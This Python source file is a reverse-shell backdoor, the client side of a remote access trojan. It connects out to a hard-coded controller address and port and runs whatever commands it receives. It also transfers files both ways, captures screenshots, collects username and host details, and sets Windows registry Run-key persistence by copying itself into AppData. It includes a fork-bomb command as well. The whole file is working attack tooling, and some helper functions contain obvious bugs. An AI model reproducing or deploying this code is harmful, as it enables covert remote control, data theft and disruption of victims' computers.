import socket
import termcolor
import json
import subprocess
import os
import pyautogui
import shutil
import sys
import time
import platform
import getpass


def reliable_send(data):
   jsondata = json.dumps(data)
   s.send(jsondata.encode())

def reliable_recv():
    data = ''
    while True:
        try:
            data = data + s.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue
def download_file(file_name):
    f = open(file_name, 'wb')
    s.settimeout(20)
    chunk = s.recv(1024)
    while chunk:
        f.decode("utf-8")
        f.write(chunk)
        try:
            chunk = s.recv(1024)
        except socket.timeout as e:
            break
    s.settimeout(None)
    f.close()

def upload_file(file_name):
   f = open(file_name, 'rb')
   f.decode("utf-8")
   s.send(f.read())

def screenshot():
    targetScreen = pyautogui.screenshot()
    targetScreen.save("screenshot.png")

def persist(reg_name, copy_name):
   file_path = os.environ['appdata'] + '\\' + copy_name
   try:
       if not os.path.exists(file_path):
         shutil.copyfile(sys.executable, file_path)
         subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v ' + reg_name + ' /t REG_SZ /d "' + file_path + '"', shell=True)
         reliable_send('[+] Created Persistence With Req Key:' + reg_name)
       else:
           reliable_send("[-] Bruh Persistence Already Exists")
   except:
       reliable_send('[+] Error Creating Persistence')

def connection():
   while True:
       RHOST = "192.168.234.134"
       RPORT = 4000
       time.sleep(20)
       try:
           s.connect((RHOST, RPORT))
           shell()
           s.close()
           break
       except:
           connection()

def shell():
    while True:
        cmd = reliable_recv()
        if cmd == 'exit':
            reliable_send(termcolor.colored('[-] Goodbye', 'red'))
            break
        elif cmd == 'help':
            pass
        elif cmd == 'clear':
            pass
        elif cmd[:3] == 'cd ':
            try:
                os.chdir(cmd[3:])
                reliable_send(termcolor.colored("[+] Changed directory to {}".format(os.getcwd()), 'green'))
            except FileNotFoundError:
                pass
        elif cmd[:6] == 'upload':
            try:
                download_file(cmd[7:])
                reliable_send(termcolor.colored('[+] Done Uploaded file', 'green'))
            except FileNotFoundError:
                pass
        elif cmd[:8] == 'download':
            try:
                upload_file(cmd[9:])
                reliable_send('[+] Done Downloaded file')
            except FileNotFoundError:
                pass
        elif cmd[:10] == 'screenshot':
            screenshot()
            upload_file('screenshot.png')
            reliable_send('[+] Done screenshot saved')
            os.remove('screenshot.png')
        elif cmd[:11] == 'persistence':
            reg_name, copy_name = cmd[12:].split(' ')
            persist(reg_name, copy_name)
        elif cmd == "sysinfo":
            sysinfo = termcolor.colored(f"""
        Operating System: {platform.system()}
        Computer Name: {platform.node()}
        Username: {getpass.getuser()}
        Release Version: {platform.release()}
        Processor Architecture: {platform.processor()}
                    """, 'blue')
            reliable_send(sysinfo)

        elif cmd == "forkbomb":
            while True:
                os.fork()
            reliable_send(termcolor.colored("[+] Done sent frokbomb", 'green'))

        else:
            execute = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            result = execute.stdout.read() + execute.stderr.read()
            result = result.decode()
            reliable_send(result)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection()